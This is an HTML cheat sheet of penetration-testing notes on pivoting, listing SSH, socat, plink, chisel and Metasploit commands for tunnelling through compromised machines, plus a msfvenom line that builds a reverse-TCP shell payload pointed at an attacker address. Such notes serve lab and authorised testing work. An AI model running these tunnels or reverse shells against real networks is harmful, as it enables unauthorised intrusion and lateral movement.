
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Pivoting</title>
</head><body><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none">Local port forwarding</li>
<li style="list-style-type: none">Forward local port to remote host</li>
<li style="list-style-type: none">ssh &lt;gateway&gt; -L &lt;local port to listen&gt;:&lt;remote host&gt;:&lt;remote port&gt;</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">Remote port forwarding</li>
<li style="list-style-type: none">Forward remote port to local host</li>
<li style="list-style-type: none">ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;</li>
<li style="list-style-type: none"></li>
<li style="list-style-type: none">Dynamic port</li>
<li style="list-style-type: none">ssh -D &lt;local proxy port&gt; -p &lt;remote port&gt; &lt;target&gt;</li>
<li style="list-style-type: none"></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<span style="font-size: 14pt"><b>Socat</b></span><br/>
<span style="font-size: 12pt">socat file:`tty`,raw,echo=0 tcp-listen:8989<br/>
<br/>
</span><b><span style="font-size: 16pt">PORT FORWARDING</span></b><span style="font-size: 12pt">&nbsp;"port to port":<br/>
</span><span style="font-size: 12pt"><b>----</b></span><b><span style="font-size: 14pt">MSF</span><span style="font-size: 12pt">----</span></b><span style="font-size: 12pt">&nbsp;Most platforms<br/>
</span><span style="font-size: 12pt">Forward: Get meterpreter session on one of the dual homed machines portfwd add -l 4445 -p 4443 -r ip Use -R to make it reverse<br/>
<br/>
</span><span style="font-size: 12pt"><b>----</b></span><b><span style="font-size: 14pt">SSH</span><span style="font-size: 12pt">----</span></b><span style="font-size: 12pt">&nbsp;For Linux<br/>
</span><span style="font-size: 12pt">~C "if you already have an SSH session"<br/>
-R 8081:ip:80 (on my Kali machine listen on 8081, get it from 172.24.0.2:80)<br/>
:8081&lt;------------:80 Now you can access 172.24.0.2:80, which you didn't have direct access to<br/>
-L 8083:ip:8084 (on your machine listen on 8083, send it to my Kali machine on 8084)<br/>
:8084&lt;------------:8083&lt;------------:XXXX run nc on port 8084, and if ip:8083 receives a reverse shell, you will get it<br/>
<br/>
</span><span style="font-size: 14pt"><b>For reverse shell: </b></span><span style="font-size: 12pt"><br/>
</span><span style="font-size: 12pt">msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.1.1.230 LPORT=8083 -f exe -o shell Run it on 2nd remote target to get a shell on Kali<br/>
Or if you didn't have an SSH session, then SSH to your Kali from target machine: On Kali: service ssh start "add a user, give it /bin/false in /etc/passwd" ssh - -R 12345:192.168.122.228:5986 test@10.1.1.1 &nbsp;<br/>
<br/>
</span><span style="font-size: 12pt"><b>---</b></span><b><span style="font-size: 14pt">PLINK</span><span style="font-size: 12pt">---- </span></b><span style="font-size: 12pt">Just like SSH, on Windows service ssh start , and transfer /usr/share/windows-binaries/plink.exe to the target machine<br/>
</span><span style="font-size: 12pt">On Target: <span style="color: #ff0000">plink.exe ip -P 22 -C -N -L 0.0.0.0:4445:ip:4443 -l KALIUSER -pw PASS</span><br/>
<br/>
</span><span style="font-size: 12pt"><b>---</b></span><b><span style="font-size: 14pt">SOCAT</span><span style="font-size: 12pt">----</span></b><span style="font-size: 12pt">&nbsp;For linux<br/>
</span><span style="font-size: 12pt">Forward your 8083 to ip:443<span style="color: #ff0000">&nbsp;./socat TCP4-LISTEN:8083,fork TCP4:ip:443</span><br/>
<br/>
</span><span style="font-size: 12pt"><b>---</b></span><b><span style="font-size: 14pt">CHISEL</span><span style="font-size: 12pt">----</span></b><span style="font-size: 12pt">&nbsp;Most platforms &nbsp;<br/>
</span><span style="font-size: 12pt">Remote static tunnels "port to port": <br/>
On Kali "reverse proxy listener": <span style="color: #ff0000">./chisel server -p 8000 -reverse</span><br/>
General command: <span style="color: #ff0000">./chisel client : L/R:[YOUR LOCAL IP]:::</span><br/>
Remote tunnels "access IP:PORT you couldn't access before": On Target:<span style="color: #ff0000">&nbsp;./chisel client ip:8000 R:127.0.0.1:8001:172.19.0.3:80 </span>&nbsp;<br/>
Local tunnels "listen on the target for something, and send it to us": On Target: <span style="color: #ff0000">./chisel client 10.1.1.1:8000 9001:127.0.0.1:8003</span><br/>
DYNAMIC "port to any": setup proxychains with socks5 on 127.0.0.1:1080 Or set up socks5 proxy on firefox For nmap use -Pn -sT or use tcp scanner in msf<br/>
<br/>
</span><span style="font-size: 12pt"><b>----</b></span><b><span style="font-size: 14pt">MSF</span><span style="font-size: 12pt">----</span></b><span style="font-size: 12pt">&nbsp;Most platforms<br/>
</span><span style="font-size: 12pt">Get meterpreter session on one of the dual homed machines Auto route to ip (multi/manage/autoroute) Start socks proxy (auxiliary/server/socks4a) &nbsp;<br/>
<br/>
</span><span style="font-size: 12pt"><b>----</b></span><b><span style="font-size: 14pt">SSH</span><span style="font-size: 12pt">---- </span></b><span style="font-size: 12pt">For Linux<br/>
</span><span style="font-size: 12pt">-D1080<br/>
<br/>
</span><span style="font-size: 12pt"><b>---</b></span><b><span style="font-size: 14pt">PLINK</span><span style="font-size: 12pt">--- </span></b><span style="font-size: 12pt">Just like SSH, on Windows<br/>
</span><span style="font-size: 12pt">On Target: <span style="color: #ff0000">plink.exe ip -P 22 -C -N -D 1080 -l KALIUSER -pw PASS</span><br/>
<br/>
</span><span style="font-size: 12pt"><b>---</b></span><b><span style="font-size: 14pt">CHISEL</span><span style="font-size: 12pt">---- </span></b><span style="font-size: 12pt">Most platforms<br/>
</span><span style="font-size: 12pt">On Kali:<span style="color: #ff0000">&nbsp;./chisel server -p 8000 -reverse</span><br/>
On Target:<span style="color: #ff0000">&nbsp;./chisel client ip:8000 R:8001:127.0.0.1:1080 ./chisel server -p 8001 --socks5</span><br/>
On Kali:<span style="color: #ff0000">&nbsp;./chisel client 127.0.0.1:8001 socks </span>&nbsp;</span></body></html>
